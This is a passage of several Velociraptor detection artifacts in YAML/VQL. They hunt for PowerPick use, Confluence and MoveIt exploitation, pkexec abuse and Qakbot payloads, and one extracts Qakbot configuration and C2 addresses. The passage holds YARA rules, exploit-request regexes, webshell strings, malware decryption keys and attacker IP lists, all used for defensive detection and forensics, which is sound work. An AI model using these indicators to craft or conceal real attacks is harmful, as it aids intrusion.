      LET payload = SELECT * 
        FROM unzip(filename=lecmdpackage[0].FullPath,
            output_directory=tmpdir)
      
      -- execute payload
      LET deploy <= SELECT * 
        FROM execve(argv=[payload.NewPath[0], 
        "-d", 
        "c:/", 
        "--csv", 
        tmpdir + "lecmd", 
        "--csvf", 
        "results.csv"])
      
      -- parse csv
      SELECT SourceFile, LocalPath, Arguments, SourceCreated, 
        SourceModified, WorkingDirectory, RelativePath, 
        TargetCreated, TargetModified, DriveType, VolumeLabel
      FROM parse_csv(filename=tmpdir + "lecmd" + "\\results.csv")
      WHERE 
        (if(condition=dateAfter, then=SourceCreated > dateAfter,
            else=TRUE) AND 
        if(condition=dateBefore, then=SourceCreated < dateBefore, 
            else=TRUE))
      AND SourceFile =~ sourceFile
      AND LocalPath =~ localPath
      AND Arguments =~ arguments

---END OF FILE---

======
FILE: /content/exchange/artifacts/PowerPickHostVersion.yaml
======
name: Alert.Windows.EVTX.PowerPickHostVersion
author: sbattaglia-r7
description: |
   
   This artifact by itself only indicates that the PowerPick tool may have
   been invoked on the client. To capture additional context, ensure that
   Powershell script block and module logging are enabled on the clients and
   deploy the Windows.ETW.Powershell artifact from the Exchange.
   
   -----
   
   This artifact is based on on PowerPick research by Crowdstrike in 
   https://www.crowdstrike[.]com/blog/getting-the-bacon-from-cobalt-strike-beacon/
   
   As noted in the blog post, when PowerPick tool is run, the PowerShell logs
   on the target system may contain an EID 400 event where the
   HostVersion and EngineVersion fields in the message have different values.
   
   In recent puprle team exercises, we observed that the mismatched HostVersion
   value was always "1.0", providing a simple way to monitor for this activity 
   as a backup to other PowerShell or CobaltStrike rules.
   
   If this artifact generates an event on a client, check the PowerShell Operational
   logs for suspicious 410x events (especially 4104).  If the Windows.ETW.Powershell
   artifact is also enabled on the client and did not fire an event, update that
   artifact's IOC list with the new information and redeploy it.
   

# Can be CLIENT, CLIENT_EVENT, SERVER, SERVER_EVENT
type: CLIENT_EVENT

parameters:
  - name: pseventLog
    default: 'C:\Windows\System32\winevt\Logs\Windows PowerShell.evtx'

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
        SELECT
            timestamp(epoch=int(int=System.TimeCreated.SystemTime)) AS EventTime,
            System.Computer as Computer,
            System.Channel as Channel,
            System.Provider.Name as Provider,
            System.EventID.Value as EventID,
            System.EventRecordID as EventRecordID,
            get(field="Message") as Message
            FROM watch_evtx(filename=pseventLog)
            WHERE EventID = 400 AND Message =~ 'HostVersion=1.0'

---END OF FILE---

======
FILE: /content/exchange/artifacts/Confluence_CVE_2023_22527.yaml
======
name: Generic.Detection.Confluence_CVE_2023_22527
author: Matt Green - @mgreen27
description: |
  This artifact detects evidence of exploitation of Confluence RCE CVE-2023-22527.
  
  The artifact checks conf_access logs for a malicious POST request and should 
  return full line of any hit (IP address and http code).
  
  Note: the underlying artifact uses Generic.Detection.Yara.Glob(). 
  Please run he notbook suggestion view hit strings for further analysis.

reference:
    - https://blog.projectdiscovery.io/atlassian-confluence-ssti-remote-code-execution/
    
type: CLIENT

parameters:
   - name: TargetGlob
     default: /**/atlassian/confluence/logs/conf_access*.log
   - name: YaraRule
     default: |
        rule LOG_CVE_2023_22527_Confluence_Jan23 {
            meta:
                description = "Detects exploitation attempts for Confluence RCE CVE-2023-22527"
                author = "Matt Green - @mgreen27"
                reference = "https://blog.projectdiscovery.io/atlassian-confluence-ssti-remote-code-execution/"
                date = "2024-01-25"
            strings:
             $s1 = /\[.{,100} POST \/template\/aui\/text-inline\.vm [^\n]{10,500}/
            condition:
              any of them
        }
   - name: UploadHits
     type: bool
     description: upload any logs with hits.

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows' OR OS = 'linux'

    query: |
      SELECT * FROM Artifact.Generic.Detection.Yara.Glob(
                        PathGlob=TargetGlob,
                        YaraRule=YaraRule,
                        NumberOfHits=999999,
                        UploadHits=UploadHits )
    notebook:
      - type: vql_suggestion
        name: View hit strings
        template: |             
            /*
            ## Show all hit strings for post processing
            */
            LET m <= memoize(query={
                SELECT vfs_path.Base as Key, vfs_path
                FROM uploads()
            }, key='Key')
            
            
            SELECT Fqdn,OSPath,Mtime,Rule,HitOffset,
                read_file(accessor='fs',filename=get(item=m, field=str(str=HitContext.StoredName)).vfs_path) as HitContext
            FROM source()
                           
column_types:
  - name: HitContext
    type: preview_upload

---END OF FILE---

======
FILE: /content/exchange/artifacts/Qakbot.yaml
======
name: Windows.Carving.Qakbot
author: Matt Green - @mgreen27
description: |
    This artifact enables Qakbot payload detection and configuration extraction 
    from a byte stream, process or file on disk. The artifact runs a yara scan 
    as a detection step, then attempts to process the payload to extract 
    configuration.
    
    QakBot or QBot, is a modular malware first observed in 2007 that has been 
    historically known as a banking Trojan. Qbot is used to steal credentials, 
    financial, or other data, and in recent years, regularly a loader for other 
    malware leading to hands on keyboard ransomware. 
    
    Qakbot (Qbot) payloads have an RC4 encoded configuration, located inside two 
    PE resources. Encoded strings and xor key can also be found inside the .data 
    section starting at a specific offset. 
    
    Some of the options available cover changes observed in the last year in the 
    decryption process to allow simplified decoding workflow:
    
    - StringOffset - the offset of the string xor key and encoded strings.
    - PE resource type - the configuration is typically inside 2 resources.
    - Unescaped key string - this field is typically reused over samples
    - Type of encoding: single or double, double being the more recent.
    - Worker threads for bulk analysis / research use cases.

    The decryption used is fairly simple with the first pass RC4 found in 
    encoded strings embedded in the malware and is often reused from previous 
    samples. 
    
    Each decoded output includes the first 20 bytes in hex as the SHA1 of the 
    data as verification. The second pass RC4 key is the next 20 bytes in hex, 
    Second pass RC4 decoding has the same verification of decrypted data.
    
    NOTE: Requires 0.6.8 for PE dump

reference:
  - https://malpedia.caad.fkie.fraunhofer.de/details/win.qakbot
  - https://docs.velociraptor.app/blog/2023/2023-04-05-qakbot/
type: CLIENT


parameters:
  - name: TargetBytes
    description: Parameter to enabling piping a byte stream of a payload dll
    default:
    type: hidden
  - name: TargetGlob
    description: Glob to target payloads on disk
    default: 
  - name: PidRegex
    description: Regex of target Process ID to scan
    default: .
    type: regex
  - name: ProcessRegex
    description: Regex of target Process Name to scan
    type: regex
  - name: StringOffset
    description: Offset of beginning of encoded strings in .data section. 
    default: 0x50
    type: int
  - name: ResourceRegex
    description: Regex to select targeted PE resource name.
    default: 'BITMAP|RCDATA'
  - name: Keys
    description: Lookup table of recent Keys. Add additional keys to extend capability.
    type: csv
    default: |
        Type,Key
        double,Muhcu#YgcdXubYBu2@2ub4fbUhuiNhyVtcd
        double,bUdiuy81gYguty@4frdRdpfko(eKmudeuMncueaN
        single,\System32\WindowsPowerShel1\v1.0\powershel1.exe
        single,\System32\WindowsPowerShell\v1.0\powershell.exe
  - name: Workers
    description: Number of workers to run. For bulk usecase increase to improve performance.
    default: 1
    type: int
  - name: YaraRule
    description: Yara rule to detect Qakbot payload.
    type: hidden
    default: |
        rule win_qakbot {
            meta:
                author = "Felix Bilstein - yara-signator at cocacoding dot com"
                date = "2023-01-25"
                description = "Detects win.qakbot."
            strings:
                $sequence_0 = { 50 e8???????? 8b06 47 }
                $sequence_1 = { e9???????? 33c0 7402 ebfa }
                $sequence_2 = { 740d 8d45fc 6a00 50 }
                $sequence_3 = { 8b06 47 59 59 }
                $sequence_4 = { eb13 e8???????? 33c9 85c0 0f9fc1 41 }
                $sequence_5 = { 7402 ebfa 33c0 7402 }
                $sequence_6 = { 0fb64903 c1e008 0bc2 c1e008 0bc1 c3 55 }
                $sequence_7 = { ebfa eb06 33c0 7402 }
                $sequence_8 = { 8d45fc 6aff 50 e8???????? 59 59 }
                $sequence_9 = { 59 59 6afb e9???????? }
                $sequence_10 = { 48 50 8d8534f6ffff 6a00 50 }
                $sequence_11 = { 5e c9 c3 55 8bec 81ecc4090000 }
                $sequence_12 = { e8???????? 83c410 33c0 7402 }
                $sequence_13 = { 7cef eb10 c644301c00 ff465c 8b465c 83f838 }
                $sequence_14 = { eb0b c644301c00 ff465c 8b465c 83f840 7cf0 }
                $sequence_15 = { c644061c00 ff465c 837e5c38 7cef eb10 c644301c00 }
                $sequence_16 = { 7507 c7466401000000 83f840 7507 }
                $sequence_17 = { 85c0 750a 33c0 7402 }
                $sequence_18 = { 72b6 33c0 5f 5e 5b c9 c3 }
                $sequence_19 = { 7402 ebfa e9???????? 6a00 }
                $sequence_20 = { c7466001000000 33c0 40 5e }
                $sequence_21 = { 6afe 8d45f4 50 e8???????? }
                $sequence_22 = { 7402 ebfa eb0d 33c0 }
                $sequence_23 = { 50 ff5508 8bf0 59 }
                $sequence_24 = { 57 ff15???????? 33c0 85f6 0f94c0 }
                $sequence_25 = { ff15???????? 85c0 750c 57 ff15???????? 6afe }
                $sequence_26 = { c3 33c9 3d80000000 0f94c1 }
                $sequence_27 = { 6a02 ff15???????? 8bf8 83c8ff }
                $sequence_28 = { 6a00 58 0f95c0 40 50 }
                $sequence_29 = { e8???????? 33c0 c3 55 8bec 51 51 }
                $sequence_30 = { 7412 8d85d8feffff 50 57 ff15???????? }
                $sequence_31 = { 00e9 8b55e4 880c1a 8a4df3 }
                $sequence_32 = { 00ca 66897c2446 31f6 8974244c }
                $sequence_33 = { 01c1 894c2430 e9???????? 55 }
                $sequence_34 = { 01c1 81e1ffff0000 83c101 8b442474 }
                $sequence_35 = { 00e9 884c0451 83c001 39d0 }
                $sequence_36 = { 01c1 8b442448 01c8 8944243c }
                $sequence_37 = { 01c1 894c2404 8b442404 8d65fc }
                $sequence_38 = { 01c1 21d1 8a442465 f6642465 }
            condition:
                7 of them and filesize < 1168384
        }

    
sources:
  - query: |
      -- parses PE and extracts EncodedStrings from the.data section
      LET encoded_strings(data) = SELECT 
            strip(suffix='\x00\x00', string=_value) as Sections
        FROM foreach(row=split(sep='\x00\x00\x00\x00',string=data))
        WHERE Sections
      LET find_data(data) = SELECT
            encoded_strings(data=read_file(filename=data,accessor='data',offset=FileOffset,length=Size)[StringOffset:]).Sections as EncodedStrings
        FROM foreach(row=parse_pe(file=data,accessor='data').Sections,
                query={ SELECT * FROM _value })
        WHERE Name = '.data'
        
      -- decodes strings only show printable
       LET decode_strings(data) = SELECT * FROM foreach(
        row={ 
            SELECT count() - 1 as Index
            FROM range(start=0, end=len(list=data))},
        query={
            SELECT 
                filter(
                    list=split(sep='\x00',string=xor(key=data[Index],string=_value)),
                    regex="^[ -~]{2,}$" ) as String
            FROM foreach(row=data[Index:])
            WHERE len(list=String) > 2 
                AND NOT String =~ '^\\s+$'
        })
            
      -- parses PE and extracts resource sections        
      LET find_resource(data) = SELECT Type, TypeId,
            FileOffset,
            DataSize,
            read_file(filename=data,accessor='data',offset=FileOffset,length=DataSize) as Data
        FROM foreach(row=parse_pe(file=data,accessor='data').Resources)
        WHERE Type =~ ResourceRegex
        ORDER BY DataSize
      
      -- first round of RC4 encoding. Verification hash is hex of first 20 bytes
      LET rc4_wth_hashed_key(data,key) = 
            crypto_rc4(
                key = unhex(string=hash(path=key,accessor='data',hashselect='SHA1').SHA1),
                string = data )
      -- second round of RC4 encoding accounting for verification.
      LET advanced_method(data,key)= 
            crypto_rc4(
                key = rc4_wth_hashed_key(data=data,key=key)[20:40],
                string = rc4_wth_hashed_key(data=data,key=key)[40:] )
      
      -- this function finds key and verifies results.
      LET decode(data) = SELECT Key,Type,
            if(condition= Type='single',
                then= rc4_wth_hashed_key(data=data,key=Key),
                else= advanced_method(data=data,key=Key)) as Data
        FROM Keys
        WHERE format(format='%x',args=Data[:20]) = hash(path=Data[20:],accessor='data',hashselect='SHA1').SHA1
        LIMIT 1
        
      -- find netaddress method with the most expected standard ports.
      LET find_c2(methods) = SELECT _value as C2, 
            len(list=filter(list=_value,regex=':(443|80|([0-9])\1{4,})$')) as Total 
        FROM foreach(row=methods) ORDER BY Total DESC
        LIMIT 1
        
      -- bytestream: only works on a payload dll as bytestream
      LET bytestream = SELECT Rule as Detection,
            hash(path=TargetBytes, accessor='data') as DataBytes,
            len(list=TargetBytes) as Size,
            find_resource(data=TargetBytes,accessor='data') as Resources,
            find_data(data=TargetBytes,accessor='data')[0].EncodedStrings as DecodedStrings
        FROM yara(  files=TargetBytes,
                    accessor='data',
                    rules=YaraRule, key='X',
                    number=1 )

      -- find target files
      LET target_files = SELECT OSPath, Size,
                Mtime, Btime, Ctime, Atime 
        FROM glob(globs=TargetGlob)
        WHERE NOT IsDir AND Size > 0
        
      -- search for qakbot in scoped files
      LET file_payloads = SELECT * FROM foreach(row= target_files,
            query={
                SELECT
                    Rule as Detection,
                    OSPath,Size,
                    dict( 
                        Mtime = Mtime, 
                        Atime = Atime,
                        Ctime = Ctime,
                        Btime = Btime
                            ) as Timestamps,
                    find_resource(data=read_file(filename=OSPath),accessor='data') as Resources,
                    find_data(data=read_file(filename=OSPath),accessor='data')[0].EncodedStrings as DecodedStrings
                FROM yara(  files=OSPath,
                            rules=YaraRule,
                            end=Size,  key='X',
                            number=1 )
            })
            WHERE log(message="Scanning file : %v", args=OSPath)
      
      -- find processes in scope of query
      LET processes = SELECT int(int=Pid) AS Pid,
              Name, Exe, CommandLine, CreateTime,Username
        FROM process_tracker_pslist()
        WHERE Name =~ ProcessRegex
            AND format(format="%d", args=Pid) =~ PidRegex
            AND log(message="Scanning pid %v : %v", args=[Pid, Name])
      
      -- find unbacked sections with xrw permission
      LET sections = SELECT * FROM foreach(
          row=processes,
          query={
            SELECT CreateTime as ProcessCreateTime,Pid, 
                Name as ProcessName,
                Exe,
                CommandLine,
                Username,
                Address as Offset,
                Size,
                pathspec(
                    DelegateAccessor="process",
                    DelegatePath=Pid,
                    Path=Address) AS _PathSpec
            FROM vad(pid=Pid)
            WHERE MappingName=~'^$'
                AND Protection='xrw'
                AND NOT State =~ 'RESERVE'
          })
      
      -- search for qakbot in suspicious sections
      LET process_hits = SELECT *
        FROM foreach(row= sections,
            query={
                SELECT
                    Rule as Detection,
                    dict( 
                        ProcessCreateTime = ProcessCreateTime,
                        Pid = Pid,
                        ProcessName = ProcessName,
                        Exe = Exe,
                        CommandLine = CommandLine,
                        Username = Username,
                        Offset = Offset,
                        PayloadSize = Size
                    ) as ProcessInfo,
                    find_resource(data=pe_dump(in_memory=Size,pid=Pid,base_offset=Offset),accessor='data') as Resources,
                    find_data(data=pe_dump(in_memory=Size,pid=Pid,base_offset=Offset),accessor='data')[0].EncodedStrings as DecodedStrings
                FROM yara(  accessor='offset',
                            files=_PathSpec,
                            rules=YaraRule,
                            end=Size,  key='X',
                            number=1 )
            })
      
      -- decode campaign from larger resrouce
      LET decode_campaign = SELECT *,
        decode(data=Resources[0].Data)[0] as Campaign,
        decode_strings(data=DecodedStrings).String as DecodedStrings
      FROM foreach(row={ SELECT * FROM switch(
                                a = if(condition=TargetBytes, then=bytestream),
                                b = if(condition=TargetGlob, then=file_payloads),
                                c = process_hits )
                        }, workers = Workers)
        
      -- decode raw C2 data from larger resource
      LET decode_c2 = SELECT *
            advanced_method(data=Resources[1].Data,key=Campaign.Key)[20:] as _C2Raw
          FROM decode_campaign
    
      -- profile to parse Qakbot C2 data: LE netaddress with a seperator
      LET PROFILE = '''
           [
             ["Qakbot1", 0, [
               ["Method1", 0, "Array",
                     {  "type": "Entry","count": 200,
                        "sentinel": "x=>x.C2 = '0.0.0.0:0'"
                     }],
               ]],
              ["Entry", 8, [
               ["__IP", 1, "uint32"],
               ["__PORT", 5, "uint16b"],
               ['C2',0,'Value',{'value':"x=>format(format='%s:%d', args=[ip(netaddr4_le=x.__IP),x.__PORT])"}],
             ]],
             ["Qakbot2", 0, [
               ["Method2", 0, "Array",
                     {  "type": "Entry2", "count": 200,
                        "sentinel": "x=>x.C2 = '0.0.0.0:0'"
                     }],
               ]],
              ["Entry2", 7, [
               ["__IP", 1, "uint32"],
               ["__PORT", 5, "uint16b"],
               ['C2',0,'Value',{'value':"x=>format(format='%s:%d', args=[ip(netaddr4_le=x.__IP),x.__PORT])"}],
             ]]
           ]'''
           
      -- calculate C2 IPs using two observed methods
      LET results = SELECT *,
            Campaign.Key as Key,
            parse_string_with_regex(string=Campaign.Data,
                regex=[
                        '''3=(?P<Timestamp>[ -~]*)\r\n''',
                        '''10=(?P<Name>[ -~]*)\r\n'''
                    ]) as Campaign,
            parse_binary(filename=_C2Raw,accessor='data', profile=PROFILE, struct="Qakbot1").Method1['C2'] as _C2method1,
            parse_binary(filename=_C2Raw,accessor='data', profile=PROFILE, struct="Qakbot2").Method2['C2'] as _C2method2
        FROM decode_c2
      
      -- finally determine C2 encoding and pretty timestamp then output rows and remove unwanted fields
      SELECT * FROM column_filter(
        query={
            SELECT *,
                Campaign + dict(Timestamp=timestamp(epoch=Campaign.Timestamp)) as Campaign,
                --upload(accessor='scope',file='_C2Raw') as C2RawUpload, --uncomment to troubleshoot bad C2
                find_c2(methods=[_C2method1,_C2method2])[0].C2 as C2
            FROM results
        }, exclude=["_C2method1","_C2method2","_C2Raw","Resources"])
---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.Detection.CVE20214034.yaml
======
name: Linux.Detection.CVE20214034
description: |
   This artifact lists processes running as root that were spawns by processes that are not
   running as root. This kind of behavior is normal for things like sudo or su but for other
   processes (especially /bin/bash) it could represent a process launched via CVE-2021-4034.

   The artifact looks for running processes with this property as well as search the auth
   log files for evidence of past execution of this exploit.

type: CLIENT

parameters:
   - name: AcceptableParentExeRegex
     description: A list of acceptable parent processes that are OK (unset to see all parents)
     type: regex
     default: ^(/usr/bin/sudo)
   - name: AuthLogsGlob
     default: /var/log/auth.log*

precondition:
    SELECT OS From info() where OS = 'linux'

sources:
  - query: |
        SELECT Pid, Ppid, Cmdline, Exe, Uids, Username, {
            SELECT Pid, Cmdline, Exe, Uids, Username
            FROM pslist(pid=Ppid)
        } AS Parent
        FROM pslist()
        WHERE Ppid 
          AND Username =~ "root"
          AND Parent.Username != Username
          AND if(condition=AcceptableParentExeRegex,
                 then=NOT Parent.Exe =~ AcceptableParentExeRegex,
                 else=TRUE)
  - name: AuthLogs
    query: |
       SELECT * FROM foreach(row={
         SELECT * FROM glob(globs=AuthLogsGlob)
       }, query={
           SELECT * FROM parse_lines(filename=FullPath)
           WHERE Line =~ "pkexec.+The value for environment variable XAUTHORITY contains suscipious content"
       })

---END OF FILE---

======
FILE: /content/exchange/artifacts/ScheduledTasks.yaml
======
name: Windows.Registry.ScheduledTasks
author: Matt Green - @mgreen27
description: |
  This artefact will collect Scheduled task information from the registry without 
  relying on the existance of an XML file in C:\\Windows\\System32\\Tasks.
  
  The artifact will attempt to find relevant XML data if exists.
  There is also an option to show only tasks  missing a Security Descriptor.
  
  TODO: cleanup, write test and add to main repo
  
reference:
  - https://www.youtube.com/watch?v=ZQeWgTP4PaY
  
type: CLIENT

parameters:
   - name: OnlyShowNullSD
     type: bool
     description: only show entries with null security descriptor

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: | 
      LET xml <= SELECT *, 
            regex_replace(source=OSPath,re='''^C:\\Windows\\System32\\Tasks''',replace='') as Path 
        FROM Artifact.Windows.System.TaskScheduler()
        
      LET tree <= SELECT Id,SD,Index
        FROM read_reg_key(globs="HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Schedule/TaskCache/Tree/**", accessor="reg")
      
      LET find_xml(path) = SELECT OSPath, Command, Arguments, ComHandler, UserId, _XML
        FROM xml WHERE Path = path
        
      LET tree_sd(id) = SELECT Id,SD,Index
        FROM tree WHERE Id = id
      
      LET tasks = SELECT 
            basename(path=Key.FileInfo.FullPath) as TaskID,
            Key.FileInfo.ModTime as Mtime,
            Path,
            Hash,
            Version,
            SecurityDescriptor,
            Source,
            Author,
            Description,
            URI,
            Triggers,
            Actions,
            DynamicInfo,
            if(condition=Schema, 
                then=format(format='0x%x',args=Schema),
                else='') as Schema,
            Date,
            Key.FileInfo.FullPath as OSPath,
            find_xml(path=Path)[0] as XmlEntry
        FROM read_reg_key(globs="HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Schedule/TaskCache/Tasks/**", accessor="reg")
     
      SELECT 
        TaskID,Mtime,Path,Hash,Version,
            SecurityDescriptor,
            tree_sd(id=TaskID)[0].SD as TreeSD,
            Source, Author, Description,URI,Triggers, Actions, DynamicInfo,
            Schema,Date,
            OSPath,
            XmlEntry
        FROM tasks
        WHERE NOT if(condition= OnlyShowNullSD,
            then= TreeSD,
            else= False )
      
column_types:
  - name: Hash
    type: hex
  - name: Triggers
    type: hex
  - name: DynamicInfo
    type: hex
  - name: TreeSD
    type: hex

---END OF FILE---

======
FILE: /content/exchange/artifacts/ConfluenceLogs.yaml
======
name: Linux.Detection.ConfluenceLogs
author: "Matt Green - @mgreen27"
description: |
  This artifact enables grep of Linux logs and targets strings observed in 
  exploitation of CVE-2022-26134.
  
  CVE-2022-26134, a critical unauthenticated remote code execution vulnerability 
  in Confluence Server and Confluence Data Center. 
  
reference:
  - https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/

parameters:
  - name: TargetFiles
    default: '/{/var/log/**,/opt/atlassian/confluence*/**/logs/*}'
  - name: SearchRegex
    description: "Regex of strings to search in log line."
    default: '%24%7B|(GET|POST).{0,20}\$\{|154\.146\.34\.145|154\.16\.105\.147|156\.146\.34\.46|156\.146\.34\.52|156\.146\.34\.9|156\.146\.56\.136|198\.147\.22\.148|221\.178\.126\.244|45\.43\.19\.91|59\.163\.248\.170|64\.64\.228\.239|66\.115\.182\.102|66\.115\.182\.111|67\.149\.61\.16|98\.32\.230\.38'
    type: regex
  - name: FilterRegex
    description: "Regex of strings to leave out of output."
    default:
    type: regex
  - name: ExcludeDirectoryRegex
    type: regex
    description: "Does not descend into directories that match this Regex."
    default: "^/(shared|proc|snap)"
  - name: ExcludePathRegex
    description: "Regex of paths to exclude from scanning."
    default: '\.journal$'
    type: regex
    
sources:
  - query: |
      LET RecursionCB <= if(condition= ExcludeDirectoryRegex,
         then="x => NOT x.OSPath =~ ExcludeDirectoryRegex",
         else="x => NOT x.OSPath =~ '^/proc' ")
      
      LET files = SELECT OSPath 
        FROM glob(globs=TargetFiles,
            nosymlink=TRUE,
            recursion_callback=RecursionCB)
        WHERE NOT IsDir AND NOT OSPath =~ ExcludePathRegex
          AND log(message="Scanning %v", args=OSPath)
      LET hits = SELECT * FROM foreach(row=files,
          query={
              SELECT OSPath, Line FROM parse_lines(filename=OSPath)
              WHERE Line =~ SearchRegex
          })
          
      SELECT * FROM if(condition=FilterRegex,
        then={ 
           SELECT * FROM hits
           WHERE NOT Line =~ FilterRegex
        },
        else={ 
           SELECT * FROM hits        
        })

---END OF FILE---

======
FILE: /content/exchange/artifacts/MoveIt.yaml
======
name: Windows.Detection.MoveIt
author: Matt Green - @mgreen27
description: | 
   This is an artifact to detect exploitation of a MoveIt critical vulnerability 
   observed in the wild. CVE-2023-34362
   
   The artifact enables detection via:
   
   - Yara: webshell, assembly and IIS logs
   - Evtx: IP ioc list and regex search
   
   Last updated: 2023-06-05T06:46Z
   
reference:
  - https://www.rapid7.com/blog/post/2023/06/01/rapid7-observed-exploitation-of-critical-moveit-transfer-vulnerability/
  - https://community.progress.com/s/article/MOVEit-Transfer-Critical-Vulnerability-31May2023
  - https://github.com/Neo23x0/signature-base/blob/master/yara/vuln_moveit_0day_jun23.yar

type: CLIENT
resources:
  timeout: 1800

parameters:
  - name: EvtxGlob
    default: '%SystemRoot%\System32\Winevt\Logs\MOVEit.evtx'
  - name: IocRegex
    type: regex
    description: "IOC Regex in evtxHunt"
    default: 'a@b\.com'
  - name: IgnoreRegex
    description: "Regex of string to ignore in Evtxhunt"
    type: regex
  - name: IpEvtxIoc
    default: |
        104.194.222.107
        146.0.77.141
        146.0.77.155
        146.0.77.183
        162.244.34.26
        162.244.35.6
        179.60.150.143
        185.104.194.156
        185.104.194.24
        185.104.194.40
        185.117.88.17
        185.162.128.75
        185.174.100.215
        185.174.100.250
        185.181.229.240
        185.181.229.73
        185.183.32.122
        185.185.50.172
        188.241.58.244
        193.169.245.79
        194.33.40.103
        194.33.40.104
        194.33.40.164
        206.221.182.106
        209.127.116.122
        209.127.4.22
        45.227.253.133
        45.227.253.147
        45.227.253.50
        45.227.253.6
        45.227.253.82
        45.56.165.248
        5.149.248.68
        5.149.250.74
        5.149.250.92
        5.188.86.114
        5.188.86.250
        5.188.87.194
        5.188.87.226
        5.188.87.27
        5.34.180.205
        62.112.11.57
        62.182.82.19
        62.182.85.234
        66.85.26.215
        66.85.26.234
        66.85.26.248
        79.141.160.78
        79.141.160.83
        84.234.96.31
        89.39.104.118
        89.39.105.108
        91.202.4.76
        91.222.174.95
        91.229.76.187
        93.190.142.131
  - name: DateAfter
    type: timestamp
    default: 1685232000
    description: "Search for events or Modification time after this date. YYYY-MM-DDTmm:hh:ssZ"
  - name: DateBefore
    type: timestamp
    description: "Search for events or Modification time after this date. YYYY-MM-DDTmm:hh:ssZ"
  - name: AllDrives
    type: bool
    description: "By default we target yara at all drives"
    default: Y
  - name: DriveLetter
    description: "Target yara drive. Default is a C: if not AllDrives"
    default: "C:"
  - name: AspxYara
    default: |
        rule WEBSHELL_ASPX_MOVEit_Jun23_1 {
           meta:
              description = "Detects ASPX web shells as being used in MOVEit Transfer exploitation"
              author = "Florian Roth"
              reference = "https://www.rapid7.com/blog/post/2023/06/01/rapid7-observed-exploitation-of-critical-moveit-transfer-vulnerability/"
              date = "2023-06-01"
              score = 85
              hash1 = "2413b5d0750c23b07999ec33a5b4930be224b661aaf290a0118db803f31acbc5"
              hash2 = "48367d94ccb4411f15d7ef9c455c92125f3ad812f2363c4d2e949ce1b615429a"
              hash3 = "e8012a15b6f6b404a33f293205b602ece486d01337b8b3ec331cd99ccadb562e"
           strings:
              $s1 = "X-siLock-Comment" ascii fullword   
              $s2 = "]; string x = null;" ascii
              $s3 = ";  if (!String.Equals(pass, " ascii
           condition:
              filesize < 150KB and 2 of them
        }
  - name: DllYara
    default: |
        rule WEBSHELL_ASPX_DLL_MOVEit_Jun23_1 {
           meta:
              description = "Detects compiled ASPX web shells found being used in MOVEit Transfer exploitation"
              author = "Florian Roth"
              reference = "https://www.trustedsec.com/blog/critical-vulnerability-in-progress-moveit-transfer-technical-analysis-and-recommendations/?utm_content=251159938&utm_medium=social&utm_source=twitter&hss_channel=tw-403811306"
              date = "2023-06-01"
              score = 85
              hash1 = "6cbf38f5f27e6a3eaf32e2ac73ed02898cbb5961566bb445e3c511906e2da1fa"
           strings:
              $x1 = "human2_aspx" ascii fullword
              $x2 = "X-siLock-Comment" wide
              $x3 = "x-siLock-Step1" wide
        
              $a1 = "MOVEit.DMZ.Core.Data" ascii fullword
           condition:
              uint16(0) == 0x5a4d and
              filesize < 40KB and (
                 1 of ($x*) and $a1
              ) or all of them
        }
  - name: LogYara
    default: |
         rule LOG_EXPL_MOVEit_Exploitation_Indicator_Jun23_1 {
            meta:
               description = "Detects a potential compromise indicator found in MOVEit Transfer logs"
               author = "Florian Roth"
               reference = "https://www.huntress.com/blog/moveit-transfer-critical-vulnerability-rapid-response"
               date = "2023-06-01"
               score = 70
            strings:
               $x1 = "POST /moveitisapi/moveitisapi.dll action=m2 " ascii
               $x2 = " GET /human2.aspx - 443 " ascii
            condition:
               1 of them
         }

         rule LOG_EXPL_MOVEit_Exploitation_Indicator_Jun23_2 {
            meta:
               description = "Detects a potential compromise indicator found in MOVEit Transfer logs"
               author = "Florian Roth"
               reference = "https://www.huntress.com/blog/moveit-transfer-critical-vulnerability-rapid-response"
               date = "2023-06-03"
               score = 70
            strings:
               $a1 = "Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.5195.102+Safari/537.36" ascii
               
               $s1 = " POST /moveitisapi/moveitisapi.dll" ascii
               $s2 = " POST /guestaccess.aspx"
               $s3 = " POST /api/v1/folders/"

               $s4 = "/files uploadType=resumable&"
               $s5 = " action=m2 "
            condition:
               1 of ($a*) and 3 of ($s*)
               or all of ($s*)
         }
  - name: NumberOfHits
    description: THis artifact will stop by default at one hit. This setting allows additional hits
    default: 1
    type: int64
  - name: ContextBytes
    description: Include this amount of bytes around hit as context.
    default: 0
    type: int
  - name: UploadYaraHits
    type: bool

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'
    
    name: Yara
    query: |
      -- check which Yara to use
      LET yara_rules <= AspxYara + '\n' + DllYara + '\n' + LogYara

      -- first find all matching files mft
      LET files = SELECT OSPath, IsDir
        FROM Artifact.Windows.NTFS.MFT(MFTDrive=DriveLetter, AllDrives=AllDrives,
            FileRegex='\.aspx$|^App_Web_[0-9a-z]{8}\.dll$|^u_.+\.log$',
            PathRegex='MoveIt|Microsoft\.net|temp|inetpub' )
        WHERE NOT IsDir
            AND NOT OSPath =~ '''.:\\<Err>\\'''
            AND ((  FileName=~ '\.aspx$' AND OSPath =~ 'MoveIt' )
                OR (FileName=~ '^App_Web_[0-9a-z]{8}\.dll$' AND OSPath =~ 'Microsoft\.net|temp' )
                OR (FileName=~ '^u_.+\.log$' AND OSPath =~ 'inetpub' ))
            AND if(condition=DateAfter,
                then= LastRecordChange0x10 > DateAfter,
                else= True)
            AND if(condition=DateBefore,
                then= LastRecordChange0x10 < DateBefore,
                else= True)

      -- scan files and only report a single hit.
      LET hits = SELECT * FROM foreach(row=files,
            query={
                SELECT
                    FileName, OSPath,
                    File.Size AS Size,
                    File.ModTime AS ModTime,
                    Rule, Tags, Meta,
                    String.Name as YaraString,
                    String.Offset as HitOffset,
                    upload( accessor='scope', 
                            file='String.Data', 
                            name=format(format="%v-%v-%v", 
                            args=[
                                OSPath,
                                if(condition= String.Offset - ContextBytes < 0,
                                    then= 0,
                                    else= String.Offset - ContextBytes),
